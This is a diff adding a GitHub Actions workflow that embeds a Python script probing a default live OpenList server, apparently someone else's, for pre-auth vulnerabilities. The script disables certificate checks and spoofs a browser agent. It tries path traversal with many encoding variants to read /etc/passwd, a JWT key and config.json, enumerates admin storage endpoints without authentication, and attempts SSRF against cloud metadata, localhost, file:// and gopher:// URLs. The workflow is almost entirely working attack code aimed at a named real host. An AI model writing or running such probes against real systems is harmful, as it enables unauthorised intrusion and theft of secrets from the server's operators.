@@ -1,0 +1,91 @@
+name: openlist-poc2-deep
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'OpenList base URL'
+        required: false
+        default: 'https://pan.yazinb.icu'
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      BASE: ${{ github.event.inputs.target }}
+    steps:
+      - name: Deeper pre-auth path-traversal / SSRF / storages probe
+        run: |
+          python3 - <<'PYEOF'
+          import urllib.request, urllib.parse, ssl, json, os
+          ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          base=os.environ['BASE'].rstrip('/')
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          def fetch(method, path, token=None, body=None, raw=False):
+              h={'User-Agent':UA,'Accept':'application/json, text/plain, */*'}
+              if token: h['Authorization']=token
+              data=None
+              if body is not None: data=json.dumps(body).encode(); h['Content-Type']='application/json'
+              req=urllib.request.Request(base+path, data=data, headers=h, method=method)
+              try:
+                  r=urllib.request.urlopen(req, timeout=30, context=ctx)
+                  b=r.read()
+                  return r.status, b if raw else b.decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() if raw else e.read().decode('utf-8','replace'))
+
+          def show(tag, s, b):
+              print("[%s] HTTP %s len=%d" % (tag, s, len(b)))
+              print("    ", b[:260].replace('\n',' '))
+
+          # --- A) absolute path traversal (classic CVE-2023-42442 on some storages uses absolute path) ---
+          print("===== A) /api/fs/get ABSOLUTE paths =====")
+          for lab, p in {
+            "/etc/passwd":"../../../../../../etc/passwd",
+            "abs /etc/passwd":"/etc/passwd",
+            "C: Windows jwt":"/data/jwt.key",
+            "raw src /etc/passwd":"../"*8+"etc/passwd",
+          }.items():
+              s,b=fetch('GET','/api/fs/get?path='+urllib.parse.quote(p,safe=''))
+              show("GET path "+lab, s, b)
+              s,b=fetch('POST','/api/fs/get', body={"path":p})
+              show("POST path "+lab, s, b)
+
+          # --- B) src param encoding variants (prior run returned len=309 -> different response) ---
+          print("===== B) src param variants (full body) =====")
+          for trav in ["../data/config.json","..%2fdata%2fconfig.json","%2e%2e%2fdata%2fconfig.json",
+                       "....//data/config.json","....\\\\data/config.json","/data/config.json",
+                       "..%252f..%252fdata%252fconfig.json"]:
+              s,b=fetch('GET','/api/fs/get?src='+urllib.parse.quote(trav,safe=''))
+              print("src=%s -> HTTP %s len=%d" % (trav, s, len(b)))
+              print("    ", b[:260].replace('\n',' '))
+
+          # --- C) double-encoding on path ---
+          print("===== C) path double-encoded =====")
+          for trav in ["..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"]:
+              s,b=fetch('GET','/api/fs/get?path='+trav)
+              show("GET dbl "+trav[:20], s, b)
+
+          # --- D) /api/fs/list storages enumeration unauth ---
+          print("===== D) storages / driver enumeration unauth =====")
+          for ep in ['/api/fs/list','/api/fs/list_my','/api/admin/storage/list','/api/admin/driver/list',
+                     '/api/public/storages','/api/storages']:
+              tok=None
+              s,b=fetch('GET', ep, token=tok)
+              show("GET "+ep, s, b)
+          # list root via body
+          s,b=fetch('POST','/api/fs/list', body={"path":"/","page":1,"per_page":50})
+          show("POST list /", s, b)
+
+          # --- E) try to coerce raw_url SSRF via /api/fs/get with a real internal-ish path using @ ---
+          print("===== E) SSRF-ish URL fetch attempts =====")
+          for u in ["https://169.254.169.254/latest/meta-data/","http://localhost:8080/","ftp://127.0.0.1:21/",
+                    "file:///etc/passwd","gopher://127.0.0.1:25/"]:
+              s,b=fetch('POST','/api/fs/get', body={"path":u})
+              show("POST "+u[:30], s, b)
+
+          print("DONE")
+          PYEOF
